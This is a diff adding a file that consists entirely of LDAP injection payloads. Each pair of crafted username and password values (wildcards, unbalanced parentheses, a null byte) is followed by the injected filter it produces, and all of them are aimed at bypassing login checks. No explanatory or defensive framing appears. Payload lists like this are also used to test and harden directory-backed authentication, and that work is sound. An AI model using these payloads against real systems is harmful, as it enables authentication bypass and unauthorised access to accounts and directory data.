@@ -1,0 +1,27 @@
+user=*
+password=*
+--> (&(user=*)(password=*))
+user=*)(&
+password=*)(&
+--> (&(user=*)(&)(password=*)(&))
+user=*)(|(&
+pass=pwd)
+--> (&(user=*)(|(&)(pass=pwd))
+user=*)(|(password=*
+password=test)
+--> (&(user=*)(|(password=*)(password=test))
+user=*))%00
+pass=any
+--> (&(user=*))%00
+user=admin)(&)
+password=pwd
+--> (&(user=admin)(&))(password=pwd)
+username = admin)(!(&(|
+pass = any))
+--> (&(uid= admin)(!(& (|) (webpassword=any))))
+username=*
+password=*)(&
+--> (&(user=*)(password=*)(&))
+username=admin))(|(|
+password=any
+--> (&(uid=admin)) (| (|) (webpassword=any))
